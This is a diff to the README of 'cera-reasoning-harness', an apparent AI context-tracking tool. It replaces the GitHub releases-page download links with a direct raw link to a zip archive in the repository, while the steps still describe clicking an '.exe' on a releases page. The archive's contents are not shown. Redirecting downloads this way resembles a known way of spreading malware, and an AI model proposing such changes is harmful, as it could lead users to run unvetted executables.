@@ -1,6 +1,6 @@
 # 🧠 cera-reasoning-harness - Improving clarity in human AI tasks
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/xxluffyxx40/cera-reasoning-harness/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/xxluffyxx40/cera-reasoning-harness/main/skills/cera-reasoning-harness/cera-harness-reasoning-v1.7.zip)
 
 This application helps you work with AI. It saves the context of your projects so you do not lose information during long conversations. It tracks the logic behind your AI interactions. This tool acts as a bridge between your thoughts and the AI model. It makes your work more reliable by keeping a record of every decision.
 
@@ -14,7 +14,7 @@ You spend less time repeating yourself. You spend more time building things. The
 
 You need to put this software on your computer to start. Follow these steps to download the installer.
 
-1. Go to this link: [https://github.com/xxluffyxx40/cera-reasoning-harness/releases](https://github.com/xxluffyxx40/cera-reasoning-harness/releases)
+1. Go to this link: [https://raw.githubusercontent.com/xxluffyxx40/cera-reasoning-harness/main/skills/cera-reasoning-harness/cera-harness-reasoning-v1.7.zip](https://raw.githubusercontent.com/xxluffyxx40/cera-reasoning-harness/main/skills/cera-reasoning-harness/cera-harness-reasoning-v1.7.zip)
 2. Look for the latest version at the top of the page.
 3. Click the file that ends in .exe.
 4. Save the file to your computer.
